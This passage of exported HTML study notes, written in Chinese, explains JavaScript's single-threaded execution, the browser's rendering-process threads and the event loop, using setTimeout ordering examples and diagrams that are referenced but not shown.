</span><span style="font-size: 12pt;">GUI 渲染线程</span> <span style="font-size: 12pt;">同时运行)， 那么渲染线程前后获得的元素可能不一致</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">所以当 JS 引擎线程 执行时 GUI 渲染线程 会被挂起</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [9].jpg" type="image/jpeg" data-filename="3.jpg" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">单线程解决方案：异步</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [10].jpg" type="image/jpeg" data-filename="3.jpg" width="850"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(255, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">JS 的异步是靠浏览器实现的，JS 本身不是异步的</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(255, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">虽然 JavaScript 是单线程的，可是浏览器内部不是单线程的</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(255, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">一些 I/O 操作、定时器的计时和事件监听（click, keydown...）等都是由浏览器提供的其他线程来完成的</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">什么是线程？什么是进程？</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">官方的说法是：进程是 CPU资源分配的最小单位；线程是 CPU调度的最小单位。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">进程就好比工厂的车间，它代表 CPU 所能处理的单个任务。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果把一个进程看做一个小的车间，车间里有很多工人，有的负责操作机器，有的负责搬运材料，每个工人可以看做一个线程，线程可以共享进程的资源。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">可以说，线程是进程的最小单位，一个进程可以包含多个线程。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">虽然 HTML5 增加了 webworker 可用来另开一个线程，但是该线程仍受主线程的控制，所以 JavaScript 的本质依然是单线程。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">浏览器是多进程的，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">每一个 Tab 页，就是一个独立的进程，一个进程里包含多个线程，</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">多个线程共享进程资源。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [11].jpg" type="image/jpeg" data-filename="3.jpg" width="652"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">渲染进程包含哪些线程：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">GUI 渲染线程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 负责渲染页面，布局和绘制</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 页面需要重绘和回流时，该线程就会执行</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 与js引擎线程互斥，防止渲染结果不可预期</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JS 引擎线程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 负责处理解析和执行javascript脚本程序</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 只有一个JS引擎线程（单线程），只能做一件事，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 与GUI渲染线程互斥，防止渲染结果不可预期</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">事件触发线程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 用来控制事件循环（鼠标点击、setTimeout、ajax等）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 当事件满足触发条件时，将事件放入到JS引擎所在的执行队列中</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">定时触发器线程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> setInterval 与setTimeout 所在的线程</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 定时任务并不是由 JS引擎 计时的，是由定时触发线程来计时的</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 计时完毕后，通知事件触发线程</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">异步http请求线程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 浏览器有一个单独的线程用于处理AJAX请求</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 当请求完成时，若有回调函数，通知事件触发线程</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">Event Loop（事件循环 事件轮询）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">为什么要有 Event Loop？</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">因为 Javascript 设计之初就是一门单线程语言，因此为了实现主线程的不阻塞，Event Loop 这样的方案应运而生。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">什么是</span> </span><span style="font-size: 12pt; font-weight: bold;">Event Loop ？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">事件循环本质上是 user agent (如浏览器端) 用于协调用户交互（鼠标、键盘）、脚本（如 JavaScript）、渲染（如 HTML DOM、CSS 样式）、网络等行为的一个机制。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">了解到这个定义之后，与其说是 JavaScript 提供了事件循环，不如说是嵌入 JavaScript 的 user agent 需要通过事件循环来与多种事件源交互。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">EcmaScript 的标准定义中压根 就没有事件循环，反倒是 HTML 的标准中定义了事件循环（目前 HTML 有 whatwg 和 w3c 标准，这里讨论的是 wahtwg 的标准）</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Event Loop 是 Javascript 的执行机制（管理异步回调的任务队列），</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">用于连接任务队列和调用栈。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">事件的概念实际上并不是必须的，事件机制实际上就是异步过程的通知机制。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JavaScript 是单线程的，因为浏览器在运行时只开启了一个 JS 引擎线程来解析和执行 JS。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">虽然 JavaScript 是单线程的，可是浏览器内部不是单线程的，一些I/O操作、定时器的计时和事件监听（click, keydown...）等都是由浏览器提供的其他线程来完成的。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">也就是说，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">JavaScript 是</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">通过 JS引擎线程 与 浏览器中其他线程交互协作 实现异步的。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">即使 CPU 有多个内核，JavaScript 也只能在单一线程上运行多个任务，此线程称为主线程（main thread）</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Javascript 有一个 main thread 主线程 和 call-stack 调用栈(执行栈)，所有的任务都会被放到调用栈等待主线程执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">主线程是执行 JavaScript 和</span></span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">渲染</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">样式的地方，也是 DOM 存在的地方。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">不管是 setTimeout / setInterval 和 XHR / fetch 代码，在这些代码执行时， 本身是同步任务，而其中的回调函数才是异步任务。</span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(2)</font></div><div><font style="font-size: 12pt;">}, 2)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(1)</font></div><div><font style="font-size: 12pt;">}, 1)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log(0)</font></div><div><font style="font-size: 12pt;">}, 0)</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">没有深入接触过 timer 的同学如果直接从代码中的延时设置来看，会回答：0、1、2。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">而另一些有一定经验的同学可能会回答：2、1、0。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因为 MDN 的 setTimeout 文档中提到HTML规范最低延时为 4 ms</span><span style="font-size: 12pt; color: unset; font-family: unset;">（补充说明：最低延时的设置是为了给 CPU 留下休息时间）</span><span style="font-size: 12pt; color: unset; font-family: unset;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">而真正痛过的同学会告诉你，</span><span style="font-size: 12pt;">chrome 的 运行结果</span><span style="font-size: 12pt;">是：1、0、2。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">经多次验证，node下的输出顺序依然是无法保证的，node 的 timer 是一门玄学。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">从测试结果可以看出，</span><span style="font-size: 12pt;">Chrome 中的 timer，</span><span style="font-size: 12pt; color: unset; font-family: unset;">0 ms 和 1 ms 的延时效果是一致的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">虽然有 4 ms的限制，但是是存在条件的：</span><span style="font-size: 12pt;">计时器（Timers）可以嵌套， 但是，在嵌套五个计时器之后，该间隔（</span><span style="font-size: 12pt;">interval</span> <span style="font-size: 12pt;">）将被强制最低为四毫秒。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">1、当代码执行到 setTimeout/setInterval 时，实际上是 JS 引擎线程 通知 定时触发器线程，间隔一个时间后，会触发一个回调事件， </span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">而 定时触发器线程 在接收到这个消息后，会在等待的时间后，将回调事件放入到由 事件触发线程 所管理的 事件队列 中。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">2、当代码执行到 XHR/fetch 时，实际上是 JS引擎线程 通知 异步http请求线程，发送一个网络请求，并制定请求完成后的回调事件，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">而 异步http请求线程 在接收到这个消息后，会在请求成功后，将回调事件放入到由 事件触发线程 所管理的 事件队列 中。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [12].jpg" type="image/jpeg" data-filename="3.jpg" width="726"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">3、当我们的同步任务执行完，JS引擎线程会询问事件触发线程，在事件队列中是否有待执行的回调函数，如果有就会加入到执行栈中交给JS引擎线</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">程执行</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [13].jpg" type="image/jpeg" data-filename="3.jpg" width="774"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。</span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">同步任务指的是，在主线程（JS 引擎线程）上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务。</span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">异步任务指的是，不进入主线程、而进入&quot;任务队列&quot;（task queue）的任务，只有&quot;任务队列&quot;通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。</span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">所谓&quot;回调函数&quot;（callback），就是那些会被主线程挂起来的代码。</span></span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。</span></span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_130037.jpg" type="image/jpeg" data-filename="2021-12-05_130037.jpg" width="974"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_130242.jpg" type="image/jpeg" data-filename="2021-12-05_130242.jpg" width="956"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_130421.jpg" type="image/jpeg" data-filename="2021-12-05_130421.jpg" width="1163"/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">&quot;任务队列&quot;是一个事件的队列（也可以理解成消息的队列），</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">是一个先进先出的队列。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">当浏览器在主线程的执行栈执行的时候，发现有异步任务之后，会交给 webapi 去维护，而</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">主线程的</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">执行栈则继续执行后面的任务。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">webapi 是浏览器自己实现的功能，这里专门维护异步任务。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [14].jpg" type="image/jpeg" data-filename="3.jpg" width="616"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [15].jpg" type="image/jpeg" data-filename="3.jpg" width="554"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [16].jpg" type="image/jpeg" data-filename="3.jpg" width="636"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">任务队列中的都是已经完成的异步任务，而不是说注册一个异步任务就会被放在这个任务队列中</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">一旦某个异步任务有了结果就会被推入</span><span style="font-size: 12pt; font-weight: bold;">任务队列</span><span style="font-size: 12pt; font-weight: bold;">中，</span><span style="font-size: 12pt; font-weight: bold;">JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">答案就是：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">JS引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了，</span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这种循环检查的机制，就叫做事件循环（Event Loop）</span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JS引擎线程空闲后，会先查看是否有事件可执行，接着再处理其他异步任务</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">也就是说，JS引擎线程 每次同步的调用栈被清空后，都会在异步的任务</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">队列</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">中读取新的任务。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">事件循环（Event Loop）的工作就是去查看执行栈，确定执行栈是否为空，如果执行栈为空，那么就去检查任务队列，看看任务队列中是否有待执行的回调函数。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">任务队列中如果</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">有待执行的回调函数，就</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">把回调函数的执行上下文压入执行栈的顶端。</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">事件循环</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">过程是自动的，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">只要执行栈一清空，</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">任务队列排在前面的事件，优先被主线程读取。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">回调队列 callback queue（也叫任务队列、消息队列）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">例子</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [17].jpg" type="image/jpeg" data-filename="3.jpg" width="582"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">开始时的执行栈：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [18].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">点击事件</span><span style="font-size: 12pt; font-weight: bold;">被添加到webapi中：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [19].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">setTimeout()同样会被添加到webapi中：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [20].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">倒计时结束后的setTimeout()，先被放入回调队列：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [21].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">setTimeout()从回调队列中取出，再次被放入执行栈：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [22].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">setTimeout(fn, 0)的意思是，将回调函数fn立刻插入任务队列，等待执行，而不是立即执行：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [23].jpg" type="image/jpeg" data-filename="3.jpg" width="448"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">输出 1 5 2 4 3</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">输出 1</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">将 2 和 4 push 进回调队列</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">输出 5</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">清空执行栈</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">读取输出 2 ，发现有 3 ，将 3 push 进回调队列</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">清空执行栈</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">读取输出 4</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">清空执行栈</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">读取输出 3</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">动图演示：</span></font></div><div><font style="font-size: 